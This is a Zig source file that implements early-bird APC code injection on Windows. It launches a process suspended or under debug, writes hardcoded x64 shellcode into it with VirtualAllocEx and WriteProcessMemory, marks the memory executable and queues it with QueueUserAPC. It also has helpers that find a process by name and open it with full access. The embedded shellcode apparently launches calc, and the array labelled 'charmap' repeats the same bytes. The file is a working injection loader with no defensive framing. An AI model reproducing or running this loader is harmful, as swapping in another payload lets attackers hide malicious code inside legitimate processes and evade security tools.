const std = @import("std");
const win = std.os.windows;
const unicode = std.unicode;
const config = @import("config");

// Windows type aliases
const DWORD = win.DWORD;
const HANDLE = win.HANDLE;
const BOOL = win.BOOL;
const LPVOID = win.LPVOID;
const LPWSTR = win.LPWSTR;
const LPCWSTR = win.LPCWSTR;
const PTHREAD_START_ROUTINE = win.PTHREAD_START_ROUTINE;
const PVOID = win.PVOID;
const SIZE_T = win.SIZE_T;
const PROCESSENTRY32 = win.PROCESSENTRY32;
const MAX_PATH = win.MAX_PATH;
const PROCESS_INFORMATION = win.PROCESS_INFORMATION;
const STARTUPINFOW = win.STARTUPINFOW;
const SECURITY_ATTRIBUTES = win.SECURITY_ATTRIBUTES;
const WINAPI = win.WINAPI;

// Windows API function declarations
extern "kernel32" fn VirtualProtectEx(handle: HANDLE, lpAddress: ?LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: *DWORD) callconv(win.WINAPI) BOOL;

extern "kernel32" fn VirtualAllocEx(
    hProcess: HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: DWORD,
    flProtect: DWORD,
) callconv(win.WINAPI) ?*anyopaque;

const VirtualProtectError = error{
    InvalidAddress,
    VirtualProtectFailed,
    UnexpectedStatus,
};

extern "kernel32" fn QueueUserAPC(
    pfnAPC: PTHREAD_START_ROUTINE,
    hThread: HANDLE,
    dwData: win.ULONG_PTR,
) callconv(WINAPI) DWORD;

extern "kernel32" fn WriteProcessMemory(
    hProcess: HANDLE,
    lpBaseAddress: *anyopaque,
    lpBuffer: [*]const u8,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(win.WINAPI) BOOL;

pub extern "kernel32" fn WaitForSingleObject(
    hHandle: HANDLE,
    dwMilliseconds: DWORD,
) callconv(win.WINAPI) DWORD;

extern "kernel32" fn CreateProcessW(
    lpApplicationName: ?LPCWSTR,
    lpCommandLine: ?LPWSTR,
    lpProcessAttributes: ?*SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*SECURITY_ATTRIBUTES,
    bInheritHandles: BOOL,
    dwCreationFlags: DWORD,
    lpEnvironment: ?LPVOID,
    lpCurrentDirectory: ?LPCWSTR,
    lpStartupInfo: *STARTUPINFOW,
    lpProcessInformation: *PROCESS_INFORMATION,
) callconv(win.WINAPI) BOOL;

extern "kernel32" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;

extern "kernel32" fn GetHandleInformation(
    hObject: HANDLE,
    lpdwFlags: *DWORD,
) callconv(win.WINAPI) BOOL;

// Windows constants
const CREATE_SUSPENDED: DWORD = 0x00000004;
const DEBUG_PROCESS: DWORD = 0x00000001;
const HANDLE_FLAG_INHERIT: DWORD = 0x00000001;
const HANDLE_FLAG_PROTECT_FROM_CLOSE: DWORD = 0x00000002;

// Add these function declarations after the other Windows API declarations
extern "kernel32" fn Process32First(
    hSnapshot: HANDLE,
    lppe: *PROCESSENTRY32,
) callconv(WINAPI) BOOL;

extern "kernel32" fn Process32Next(
    hSnapshot: HANDLE,
    lppe: *PROCESSENTRY32,
) callconv(WINAPI) BOOL;

// Add OpenProcess declaration with other Windows API functions
extern "kernel32" fn OpenProcess(
    dwDesiredAccess: DWORD,
    bInheritHandle: BOOL,
    dwProcessId: DWORD,
) callconv(WINAPI) HANDLE;

pub fn main() !void {
    // calc shellcode
    // const shellcode = [_]u8{ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };
    // charmap shellcode
    const shellcode = [_]u8{ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };

    // pass the build script into the main program
    const process_creation = config.createprocess;
    const process_name = config.processname;

    const options = [_][]const u8{
        "suspended",
        "debug",
    };

    // Create a general purpose allocator
    var gpa = std.heap.DebugAllocator(.{}){};
    const alloc = gpa.allocator();

    // Create UTF-16 command line for `notepad.exe`
    // const wide_cmd_line = try unicode.utf8ToUtf16LeAllocZ(alloc, "notepad.exe");
    const wide_cmd_line = try unicode.utf8ToUtf16LeAllocZ(alloc, process_name);

    // defer alloc.free(wide_cmd_line);

    // Initialize variables
    var hProcess: HANDLE = undefined;
    var hThread: HANDLE = undefined;
    var dwProcessId: u32 = undefined;

    // Check the build option and call the appropriate function
    std.debug.print("[+] Launching process as: {s}\n", .{process_creation});
    std.debug.print("[+] Process name: {s}\n", .{process_name});

    if (@intFromBool(std.mem.eql(u8, process_creation, options[0])) == 1) {
        if (!CreateSuspendedProcess(CREATE_SUSPENDED, wide_cmd_line, &dwProcessId, &hProcess, &hThread)) {
            std.debug.print("[+] Created suspended process failed.\n", .{});
            exit();
        }
    } else if (@intFromBool(std.mem.eql(u8, process_creation, options[1])) == 1) {
        std.debug.print("[+] Input type is debug\n", .{});
        if (!CreateSuspendedProcess(DEBUG_PROCESS, wide_cmd_line, &dwProcessId, &hProcess, &hThread)) {
            std.debug.print("[+] CreateSuspendedProcess() failed.\n", .{});
            exit();
        }
    }

    std.debug.print("[+] CreateSuspendedProcess() succeeded.\n", .{});
    std.debug.print("[+] Process ID (PID): {d}\n", .{dwProcessId});
    std.debug.print("[+] Process handle: {*}\n", .{hProcess});
    std.debug.print("[+] Thread handle: {*}\n", .{hThread});

    // Allocate memory in the remote process
    const remote_buffer = VirtualAllocEx(hProcess, null, shellcode.len, win.MEM_COMMIT | win.MEM_RESERVE, win.PAGE_READWRITE);
    if (remote_buffer == null) {
        std.debug.print("[+] VirtualAllocEx() failed.\n", .{});
        exit();
    }

    // Write the shellcode to the remote process
    var bytes_written: usize = 0;
    if (WriteProcessMemory(hProcess, remote_buffer.?, &shellcode, shellcode.len, &bytes_written) == win.FALSE) {
        std.debug.print("[+] WriteProcessMemory() failed.\n", .{});
        exit();
    }
    std.debug.print("[+] WriteProcessMemory() succeeded.\n", .{});

    // Change the memory protection of the remote buffer to executable
    var old_protect: win.DWORD = 0;
    if (VirtualProtectEx(hProcess, remote_buffer, shellcode.len, win.PAGE_EXECUTE_READ, &old_protect) == win.FALSE) {
        std.debug.print("[+] VirtualProtect() failed.\n", .{});
        exit();
    }
    std.debug.print("[+] VirtualProtect() succeeded.\n", .{});

    // Queue user APC time!!!
    const apc_result = QueueUserAPC(@ptrCast(remote_buffer), hThread, 0);
    if (apc_result == 0) {
        std.debug.print("[-] QueueUserAPC() failed.\n", .{});
        exit();
    }
    std.debug.print("[+] QueueUserAPC() succeeded. APC queued.\n", .{});

    const resume_result = ResumeThread(hThread);
    if (resume_result == 0xFFFFFFFF) {
        std.debug.print("[-] ResumeThread() failed.\n", .{});
        exit();
    }
    std.debug.print("[+] ResumeThread() succeeded. Thread resumed, APC should execute.\n", .{});

    // Optional: Wait for the process to complete
    std.debug.print("[+] Waiting for process execution...\n", .{});
    _ = WaitForSingleObject(hProcess, 5000); // Wait 5 seconds

    std.debug.print("[+] APC injection completed successfully!\n", .{});
}

pub fn CreateSuspendedProcess(dwCreationFlags: DWORD, lpProcessName: ?LPWSTR, dwProcessId: *u32, hProcess: *HANDLE, hThread: *HANDLE) bool {

    // Initialize structs
    var startup_info: win.STARTUPINFOW = std.mem.zeroes(win.STARTUPINFOW);
    var process_info: win.PROCESS_INFORMATION = std.mem.zeroes(win.PROCESS_INFORMATION);

    const result: BOOL = CreateProcessW(
        null,
        lpProcessName,
        null,
        null,
        win.FALSE,
        dwCreationFlags, // Use the manually defined constant
        null,
        null,
        &startup_info,
        &process_info,
    );
    if (result == win.FALSE) {
        std.debug.print("[+] CreateProcessW() failed.\n", .{});
        exit();
    }

    std.debug.print("[+] DONE\n", .{});

    // Populate the output parameters
    dwProcessId.* = process_info.dwProcessId;
    hProcess.* = process_info.hProcess;
    hThread.* = process_info.hThread;

    return true;
}

fn GetRemoteProcessId(szProcessName: []const u8) anyerror!DWORD {
    const szProcessNameLength = szProcessName.len;

    var pName: [MAX_PATH]u8 = undefined;
    @memcpy(pName[0..szProcessNameLength], szProcessName[0..szProcessNameLength]);

    var process_entry: PROCESSENTRY32 = undefined;
    process_entry.dwSize = @sizeOf(PROCESSENTRY32);

    const snapshot = win.kernel32.CreateToolhelp32Snapshot(win.TH32CS_SNAPPROCESS, 0);
    if (snapshot == win.INVALID_HANDLE_VALUE) {
        return error.ProcessNotFound;
    }
    defer win.CloseHandle(snapshot);

    var loop = Process32First(snapshot, &process_entry);
    if (loop == win.FALSE) {
        return error.ProcessNotFound;
    }

    while (loop == win.TRUE) : (loop = Process32Next(snapshot, &process_entry)) {
        //convert Proc.szExeFile to lower case
        var j: usize = 0;
        while (j < MAX_PATH and process_entry.szExeFile[j] != 0) {
            process_entry.szExeFile[j] = std.ascii.toLower(process_entry.szExeFile[j]);
            j += 1;
        }
        // cast szExeFile to a sentinel-terminated pointer and create a slice
        const temp: [*c]u8 = @ptrCast(&process_entry.szExeFile);
        const exeFileName = std.mem.span(temp);

        if (std.mem.eql(u8, exeFileName, pName[0..szProcessNameLength])) {
            return process_entry.th32ProcessID;
        }
    }

    return error.ProcessNotFound;
}

fn GetRemoteProcessHandle(szProcessName: []const u8, dwProcessId: *u32, pProcess: *HANDLE) bool {
    const szProcessNameLength = szProcessName.len;

    var pName: [MAX_PATH]u8 = undefined;
    @memcpy(pName[0..szProcessNameLength], szProcessName[0..szProcessNameLength]);

    var process_entry: PROCESSENTRY32 = undefined;
    process_entry.dwSize = @sizeOf(PROCESSENTRY32);

    std.debug.print("[+] Looking for process: {s}\n", .{pName[0..szProcessNameLength]});

    const snapshot = win.kernel32.CreateToolhelp32Snapshot(win.TH32CS_SNAPPROCESS, 0);
    if (snapshot == win.INVALID_HANDLE_VALUE) {
        std.debug.print("[-] CreateToolhelp32Snapshot() failed.\n", .{});
        return false;
    }

    defer win.CloseHandle(snapshot);

    var loop = Process32First(snapshot, &process_entry);
    if (loop == win.FALSE) {
        std.debug.print("[-] Process32FirstW() failed.\n", .{});
        return false;
    }

    while (loop == win.TRUE) : (loop = Process32Next(snapshot, &process_entry)) {
        //convert Proc.szExeFile to lower case
        var j: usize = 0;
        while (j < MAX_PATH and process_entry.szExeFile[j] != 0) {
            process_entry.szExeFile[j] = std.ascii.toLower(process_entry.szExeFile[j]);
            j += 1;
        }
        // cast szExeFile to a sentinel-terminated pointer and create a slice
        const temp: [*c]u8 = @ptrCast(&process_entry.szExeFile);
        const exeFileName = std.mem.span(temp);

        if (std.mem.eql(u8, exeFileName, pName[0..szProcessNameLength])) {
            dwProcessId.* = process_entry.th32ProcessID;

            const processHandle = OpenProcess(0x1fffff, 0, process_entry.th32ProcessID);
            if (processHandle == win.INVALID_HANDLE_VALUE) {
                std.debug.print("[-] OpenProcess() failed.\n", .{});
                return false;
            }

            pProcess.* = processHandle;

            return true;
        }
    }

    return false;
}

pub fn exit() noreturn {
    std.debug.print("Exiting...\n", .{});
    @import("std").process.exit(0);
}
